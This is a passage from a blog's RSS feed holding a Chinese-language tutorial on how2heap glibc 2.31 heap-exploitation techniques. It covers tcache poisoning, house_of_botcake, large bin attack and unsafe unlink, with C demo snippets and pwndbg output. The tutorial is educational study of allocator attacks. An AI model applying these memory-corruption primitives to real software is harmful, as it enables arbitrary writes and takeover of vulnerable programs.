350fb4cf4acf9ee0b529d34dc3854ff7bfdf926ea03a8107cfb5f7a43e859a7bc35c1cc903a666674306cb712cd7cdd1eb2a4deeb49ed2a8d6b46f7d41e94ba7d729df5bbafb67fd04278540bb554ecceaa083b6c72e3ae46ad44d19f1fd0ae32e522192f644398ac9df0175b03a7b6beb3a9b109b80e409e01792ab280316ef5cf08e8349d598de2e51a59aa377791598ac7d60a8628aec35c945c593bc367cff419349df53697c76fe83cf04a171ab5271c3abdf8dba366c9d00fe9e20d765cf0a994178151215099c57bde43c8b339f3180833b97c26164137e8c9e43e4c3e6c6bd986d48d0d7a54d5e9c919eda0600ec93ffbaf0d96d4c3fa786d62128531c9bc4c0dbdbb85ebc110a9aee1e6c42e403fbc0ef8747e7518aafff5dd66787ea098407ae1ee227e35f912d5d6e8c2d9c53a1e9fcd55401acc6a3a75a4e3e2543764f18c332a95af3257fb8f17157f47c2c6e12ae4086e6028eff549e3d8c6e6721af49a0f2c9e71f1ed00b0f8a59b7d8c517749d80f7c0a0b372efd77941f130d01528d7952f2bfbcfb5f0f6b5b99708025c6189cc21cdb587b657e6f86be0985798e103b410f501590db98d211bf342d6f8b0afe8808e94bbebe18daf8f736a7a3f4feabda28e8a142c96afa0ed9bb51999ba01bcce4e285123615409ef6577adbe6b4eda6b18c69baa19aff13894b4ad5140fc1b0083534ebf45946ac72c0f951c12a0a20698fc0a8c4dc81d8ab5871221df08cc5a636d97b605836fa22e4cdb52a2494ee33ecc20b275bd6b35ede6a89dfdb35ae74e1ade423c0a3d9a12e80218316492814780c45c074993933a21a5019def3786167cc575007313e8164e96208ad93ce588ef5349cdc08fd6a5dbe186acc597169aaae07d12d9d91e4c54dc111d26f5714b102dda88b15e4f90a617fe7e32cdc118b407339561b816d8ed818973fcbcf963d507e625a6813e1cf069f36285230f61e18f118ed2e5d17363ccd026875839b0466781c60f4c20969c28e2210ec91aaa237f05e0ba0f1e82854ba2b900ff165c2d5895af266540f394d2b1fba73b26ebebaf4a63a6caaaaff70e5498e69c35d11b8d3732d07f3dc9708083c2fb5428b0fd4096c244e9f04b9227b41e1ad85f11e2d766350fd2856774ef875c2f3f157a916a04e7ae2f3a47b9141726095596b61918859eb41665b97daa86551899f44840493021c0f3e97b60cf94ef4fdd1c70e625b5ab46fee7f7c1a7105af54cada2e6fbe527bd952d1c057c3f31c0562e810689ba5a6fa138ace228c621e7006d71ee5bcf7190d7a574ae31bcfb078c58653089b1b5321ae4e54f32e8e17d9c9ef0b651c2d9a2a3ba2ad93b1feed47e6d941c1d0a0077c98a3e753cb184c879d219f16500053b04c03c5017a7554c8f8ad76d6ec201701ef495d7a086c2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/07/28/%E3%80%90eBPF%E3%80%91Overview/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Educational Heap Exploitation 2.0 (how2heap glibc 2.31)</title>
      <link>https://billyotry.github.io/2021/07/17/Educational%20Heap%20Exploitation%202.0%20(how2heap%20glibc%202.31)/</link>
      <guid>https://billyotry.github.io/2021/07/17/Educational%20Heap%20Exploitation%202.0%20(how2heap%20glibc%202.31)/</guid>
      <pubDate>Sat, 17 Jul 2021 09:36:04 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;1-fastbin-dup&quot;&gt;&lt;a href=&quot;#1-fastbin-dup&quot; class=&quot;headerlink&quot; title=&quot;1. fastbin_dup&quot;&gt;&lt;/a&gt;1. fastbin_dup&lt;/h2&gt;&lt;p&gt;关于 fastbin attack 在glibc
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="1-fastbin-dup"><a href="#1-fastbin-dup" class="headerlink" title="1. fastbin_dup"></a>1. fastbin_dup</h2><p>关于 fastbin attack 在glibc 2.31 上没有什么变化，这里给的样例是通过 double-attack 漏洞修改构造两个指针指向同一个 chunk 的情景</p><p>程序首先 malloc 了 8 此，然后 free 了 7 次（用来填充tcache bins）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line"><span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时 tcache bins 已经填满</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618049605/0" alt="image-20210605215153140"></p><p>然后用 calloc 分配了 3 个chunk，使用 calloc 分配的时候，此时不会从tcache bins拿已经 free掉的 chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>然后进行 double free 操作即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p>至此怎么利用懂得都懂，就不多说了</p><h2 id="2-fastbin-reverse-into-tcache"><a href="#2-fastbin-reverse-into-tcache" class="headerlink" title="2. fastbin_reverse_into_tcache"></a>2. fastbin_reverse_into_tcache</h2><p>首先分配一定数量的chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">   ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后 free 填充我们的 tcache bins</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618069283/0" alt="image-20210605215933226"></p><p>释放我们的目标 chunk 即 ptrs[7]</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">  <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">  <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">  <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">  victim</span><br><span class="line">);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br></pre></td></tr></table></figure><p>接着释放剩下的 8 - 14 的chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>此时的bin</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618081765/0" alt="image-20210605220337747"></p><p>假设我们有一个堆溢出漏洞，可以覆盖 victim 的内容，我们此时将栈上一个构造好的list的地址赋予 victim</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">*(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>此时的victim如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618090767/0" alt="image-20210605220650657"></p><p>接下来我们 malloc 7次，清空 tcache bin</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Empty tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现 fastbin 的最后一个 chunk 的 fd 被我们改成了 stack 的地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618097007/0" alt="image-20210605220931514"></p><p>此时我们malloc一次，会发现</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618102417/0" alt="image-20210605221133082"></p><p>此时，原本在 fastbin 的chunk list 都被放到了 tcache bins里</p><p>如果我们最后再malloc一次，我们就能拿到栈地址（ tcache 不检查size域）</p><p>这里具体为什么会这样，我也8知道，我调试发现首先会从fastbin的链表头开始将chunk放入tcache</p><p>我猜测可能是fastbin大于7个的时候，就会这样，并且是从fastbin链表头开始，所以进入到tcache的时候就会返过来。</p><p>后面就不用说了，再次分配就能分配到栈上了。</p><h2 id="3-house-of-botcake"><a href="#3-house-of-botcake" class="headerlink" title="3. house_of_botcake"></a>3. house_of_botcake</h2><p>一种 tcache poisoning attack ，通过一些手段，在tcachebins 中写入目标地址</p><p>此时我们的tcache bin被填满</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618161189/0" alt="image-20210605223658518"></p><p>然后我们 free a 再 free prev，由于 prev 与 a 是相邻 chunk，所以会触发合并</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(prev);</span><br></pre></td></tr></table></figure><p>触发合并后，在 unsorted bin 里的是 prev chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618196491/0" alt="image-20210605225221216"></p><p>然后我们要想办法把 chunk a 放入tcache bin里，由于此时tcache bin 是满的，所以我们先取一个出来，然后在 free 一次 a。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"><span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br></pre></td></tr></table></figure><p>此时 a chunk 就会被放入 tcahcebins 里，同时 prev 可以控制 chunk a 的内容</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618201263/0" alt="image-20210605225447090"></p><p>所以我们从此时的 unsortedbin 给他分一块出来，然后修改其 fd 的值</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618223423/0" alt="image-20210605230443691"></p><p>那么此时我们就成功污染了 tachebin 的内容</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618224833/0" alt="image-20210605230517758"></p><p>我们接着只需要两次 malloc 就能拿到 0x7fffffffddc0 这个地址</p><p>其实就chunk_overpaping，一个大的chunk，包含了一个chunk，堆风水有什么好学的（逃</p><h2 id="4-house-of-einherjar"><a href="#4-house-of-einherjar" class="headerlink" title="4. house_of_einherjar"></a>4. house_of_einherjar</h2><p>这里展示的是通过一字节溢出，取到任意地址的技术</p><p>首先在堆上伪造一个 chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618291214/0" alt="image-20210605233802077"></p><p>我们再申请chunk b和chunk c </p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618294763/0" alt="image-20210605234002884"></p><p>然后此时假设我们有一个一字节溢出，可以覆盖到 c chunk 的size域，此时chunk c的pre inuse位置零，从0x101变成了0x100，因为新版本的原因，我们还要伪造pre_size为0x60</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618323935/0" alt="image-20210605235608527"></p><p>紧接着，照样填满 tcache, 然后我们去free chunk c，由于 chunk c 的 prev_inused 为0，则认为前面的 chunk 是free 的此时会有一个向前合并的过程,这样我们就会有两个指针指向 fake chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618328608/0" alt="image-20210605235838014"></p><p>然后我们此时再 malloc 一个 0x158 大小的chunk ，合并后大小为 0x160, 然后此时 合并后的 chunk 就会被整块取出,</p><p>然后我们在进行如下操作</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line"><span class="built_in">free</span>(pad);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p>那么此时 chunk b 也会加入到 tcache bin里，且指向了刚 free 的 pad chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618337803/0" alt="image-20210606000151527"></p><p>由此， chunk d 可对 chunk b进行任意修改 （堆块重叠了）</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618353003/0" alt="image-20210606000442998"></p><p>接下来怎么做就不讲了</p><h2 id="5-large-bin-attack"><a href="#5-large-bin-attack" class="headerlink" title="5. large_bin_attack"></a>5. large_bin_attack</h2><p>通过该技术向目标地址写入一个大值</p><p>2.30 之后关于 largs bin 的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里加了两个检查</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted </span></span><br><span class="line"><span class="string">(nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>导致传统的 large bin attack 没法使用</p><p>但是存在一个新的利用路径:</p><p>首先分配如下堆块</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"><span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br></pre></td></tr></table></figure><p>0x20 的为 guard chunk，避免 free 之后 chunk 合并，然后我们 free p1，此时 chunk p1会放入unsorted bin</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619120901/0" alt="image-20210606104412366"></p><p>然后我们再 malloc 一个比 p1 大的 chunk（我猜是为了不切割 p1），此时 p1 会被放入到 largebin</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619123801/0" alt="image-20210606104519006"></p><p>然后我们再 free p2（p2 大小小于 p1和p3），此时 p2 就会被放入到 unsorted bin里</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619134703/0" alt="image-20210606104906680"></p><p>然后我们修改 p1 的bk_nextsize 指向 target-0x20，此时 p1 在 largebin 里</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619506350/0" alt="image-20210606130910387"></p><p>然后我们再 malloc 一个比 p2 大的 chunk（此时 p2 在unsorted bin 里），那么此时，就会将 p2 从unsorted bin取出，放入到largebin 里，那么就存在如下代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 victim 是 p2 ，fwd为largebin表头，bck为 largebin 中的最后一个chunk，也就是最小的那个，也就是我们这里的 p1</p><p>最后的效果就是</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619984845/0" alt="image-20210606161034580"></p><p>通常而言，这种写大数的行为，我们可以用来修改 <code>global_max_fast</code>。这里为什么想到的，估计是根据victim-&gt;bk_nextsize可控，那么victim-&gt;bk_nextsize-&gt;fd_nextsize可控就能写入一个vitcim。那么为什么victim-&gt;bk_nextsize，反推回去就是fwd-&gt;fd-&gt;bk_nextsize可控，这个可控翻译过来<strong>其实就是largebin中链表尾部，也就是最小的那个chunk的bk_nextsize可控，然后再其中写入 目标地址-0x20</strong></p><h2 id="6-overlapping-chunks"><a href="#6-overlapping-chunks" class="headerlink" title="6. overlapping_chunks"></a>6. overlapping_chunks</h2><p>通过修改 size 造成堆重叠，然后拿到两个指针指向同一个chunk</p><p>首先分配如下chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620159097/0" alt="image-20210606170537795"></p><p>然后修改 p2 的大小为 p2+p3</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620165603/0" alt="image-20210606170731428"></p><p>然后释放p2</p><p>再分配一个新的大小符合修改之后的 chunk，可以把修改完 chunk 之后的 p2+p3 重新分配回来</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620189326/0" alt="image-20210606171331954"></p><p>可以看到 p4 将 p3 包含进去了</p><h2 id="7-mmap-overlapping-chunks"><a href="#7-mmap-overlapping-chunks" class="headerlink" title="7. mmap_overlapping_chunks"></a>7. mmap_overlapping_chunks</h2><p>在Glibc中，有一个点，当一个分配是如此之大，以至于malloc决定我们需要一个单独的内存部分来处理它，而不是在正常的堆上分配它。这是由于mmap_threshold var. 代替正常的获取块的逻辑，系统调用Mmap。这将分配一段虚拟内存，并把它还给用户。同样，释放的块不是还给bin或堆的其他部分，而是使用另一个syscall。Munmap，它接受一个先前分配的Mmap块的指针，并将其释放回内核。Mmap chunks在大小元数据上有一个特殊的位；第二位，如果这个位被设置，那么这个块就被分配为一个Mmap块。</p><p>Mmap分块有一个prev_size和一个size。大小代表当前的 分块的大小。一个chunk的<em>prev_size</em>表示剩余的空间。的大小（不是直接低于大小的分块）。然而，fd和bk指针并没有被使用，因为Mmap chunks并没有返回到 的大小，就像GLibC Malloc中的大多数堆块一样。释放后， 分块必须是页面对齐的。 下面的POC本质上是一个重叠的chunk攻击，但在mmap chunks上。这和<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c</a> 非常相似。主要的区别是，mmapped chunks有特殊的属性，并且是 以不同的方式处理，创造出与正常情况下不同的攻击场景。重叠的分块攻击。还可以做其他的事情。如munmapping系统库、堆本身和其他东西。 这只是一个简单的概念证明，目的是为了证明一般的 的方法来执行对 mmap 分块的攻击。 关于GLibC中mmap chunks的更多信息，请阅读这篇文章。<a href="http://tukan.farm/2016/07/27/munmap-madness/">http://tukan.farm/2016/07/27/munmap-madness/</a></p><p>首先分配几个大的 chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> <span class="keyword">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br></pre></td></tr></table></figure><p>此时我们可以知道 mmap_chunk_3 的 prev_size 和 size 分别为 0 和 0x101002</p><p>假设我们有一个漏洞可以修改 size，将其改为 0x202002，然后我们free mmap_chunk_3</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620838707/0" alt="image-20210606205214402"></p><p>这个时候我们再 malloc 一个大小 0x300000 ， 由于前面发生的合并，所以我们会得到一个 重叠的 chunk</p><p>然后我们修改 overlapping_chunk 的数据内容的同时，就是把 mmap_chunk_2 的值修改了</p><h2 id="8-tcache-house-of-spirit"><a href="#8-tcache-house-of-spirit" class="headerlink" title="8. tcache_house_of_spirit"></a>8. tcache_house_of_spirit</h2><p>首先 malloc 一个 chunk，并且在栈上有一个可控目标</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620853329/0" alt="image-20210606205811019"></p><p>将这个可控目标伪造成一个一个chunk ，修改其大小</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620866621/0" alt="image-20210606210254084"></p><p>free 这个伪造的 chunk </p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620867677/0" alt="image-20210606210312027"></p><p>此时，我们再malloc 一次，就能把这个栈地址拿回来</p><h2 id="9-tcache-poisoning"><a href="#9-tcache-poisoning" class="headerlink" title="9. tcache_poisoning"></a>9. tcache_poisoning</h2><p>通过劫持修改 tcache fd 的形式来，来获取一个目标地址, 这里的目标是一个栈地址， 作用与 8 挺相似的</p><p>malloc 两个 chunk ，分别为 a 和 b，然后将它们 free </p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620878140/0" alt="image-20210606210601763"></p><p>就有如上的链表结构，假设我们可以溢出第一个 chunk，那么们就能修改第二个 chunk 的fd ,则我们将 chunk b 的fd 修改为栈地址,此时 tcachebins 就变成如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620880800/0" alt="image-20210606210703811"></p><p>我们就发现 变成了 b —&gt; &amp;stack_var ,然后我们只需 malloc 两次就能将栈地址拿到</p><h2 id="10-tcache-stashing-unlink-attack"><a href="#10-tcache-stashing-unlink-attack" class="headerlink" title="10. tcache_stashing_unlink_attack"></a>10. tcache_stashing_unlink_attack</h2><p>tcache 上的 stashing unlink attack</p><p>当你能够覆盖victor-&gt;bk指针时，可以使用这个技术。此外，至少需要用calloc分配一个chunk。</p><p>在glibc中，将smallbin放入tcache的机制给了我们发动攻击的机会. 这种技术允许我们把libc addr写到任何我们想要的地方，并在任何需要的地方创建一个假的chunk。在这种情况下，我们将在堆栈上创建一个假的chunk.</p><p>例如此时我们在栈上伪造一个 chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620898563/0" alt="image-20210606211334467"></p><p>首先我们向 fake_chunk-&gt;bk 写一个可写的地址，以绕过 glibc 中的 bck-&gt;fd = bin。这里我们选择 stack_var[2] 的地址作为fake bk。之后我们可以看到 *（fake_chunk -&gt;bk + 0x10），也就是 stack_var[4]在攻击后将成为libc addr</p><p>malloc 9 个 chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free 7 个 chunk，填满 tcache</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620924124/0" alt="image-20210606212230058"></p><p>这个我们注意一下， tcache bin 的最后一个bin是 chunk_lis[1]</p><p>然后在 unsort bin 里放入两个 chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620928836/0" alt="image-20210606212338715"></p><p>然后分配一个大于 0x90 的chunk ，这个时候 chunk0 和 chunk2 会被放入 smallbin 里</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620930621/0" alt="image-20210606212406868"></p><p>然后，我再 malloc 两个 chunk ，从tcache bin 取出两个 chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620934511/0" alt="image-20210606212505414"></p><p>然后此时，我们假设有一个漏洞能修改 chunklis[2] 的 bck，就是small bin链表头的那个chunk的bk，此时的 bins 如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620945815/0" alt="image-20210606212924738"></p><p>然后我们 calloc 一个新 chunk，此时</p><p>smallbin 的chunk 会被重新填充到 tache bin里，然后我们可以通过 tcache 没有严格的检查，再将 fake chunk 取出</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620956101/0" alt="image-20210606213258292"></p><p>可以看到放入到tcache的首先是我们的 chunklis[2] 然后是我们伪造的bck，接着calloc分配出去的是 chunklis[0]</p><p>通过 calloc 的返回值判断</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620988157/0" alt="image-20210606214448089"></p><h2 id="11-unsafe-unlink"><a href="#11-unsafe-unlink" class="headerlink" title="11. unsafe_unlink"></a>11. unsafe_unlink</h2><p>分配两个足够大的 chunk ，free 后不会被放入 fastbin 和tcache （0x420)</p><p>然后我们需要在堆上伪造一个 chunk</p><p>我们设置好 size ， fd ，bk 以</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13621032579/0" alt="image-20210606220237753"></p><p>我们假设我们在chunk0有一个溢出，这样我们就可以自由地改变chunk1的数据</p><p>例如改chunk1的prev_size 和 size</p><p>bypass check</p><p><code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</code></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13621044549/0" alt="image-20210606220615560"></p><p>此时我们 free chunk1，因为此时pre_inuse位为0，就会认为前一个chunk为free，此时我们已经伪造了pre_size，此时就会unlink前一个chunk，也就是unlink fake chunk</p><p>最后 我们可以使用chunk0_ptr覆盖自身，另其指向一个任意位置,达到一个任意地址写的目的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ► 54 chunk0_ptr[3] = (uint64_t) victim_string;</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr</span><br><span class="line"><span class="variable">$22</span> = 0x565403b5b008</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[3]</span><br><span class="line"><span class="variable">$23</span> = 0x565403b5b008</span><br><span class="line">pwndbg&gt; x/20gx 0x565403b5b008</span><br><span class="line">0x565403b5b008:0x0000565403b5b0080x00007f8ca43e66a0</span><br><span class="line">0x565403b5b018 &lt;completed&gt;:0x00000000000000000x0000565403b5b008</span><br><span class="line">0x565403b5b028:0x00000000000000000x0000000000000000</span><br><span class="line">─────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────</span><br><span class="line">   54 chunk0_ptr[3] = (uint64_t) victim_string;</span><br><span class="line">   55</span><br><span class="line"> ► 56 <span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; p/x chunk0_ptr</span><br><span class="line"><span class="variable">$24</span> = 0x7ffe4dfce4d0</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[3]</span><br><span class="line"><span class="variable">$25</span> = 0x7f8ca42210b3</span><br><span class="line">pwndbg&gt; x/s 0x7ffe4dfce4d0</span><br><span class="line">0x7ffe4dfce4d0:<span class="string">&quot;Hello!~&quot;</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   58 chunk0_ptr[0] = 0x4141414142424242LL;</span><br><span class="line"> ► 59 <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/s 0x7ffe4dfce4d0</span><br><span class="line">0x7ffe4dfce4d0:<span class="string">&quot;BBBBAAAA&quot;</span></span><br><span 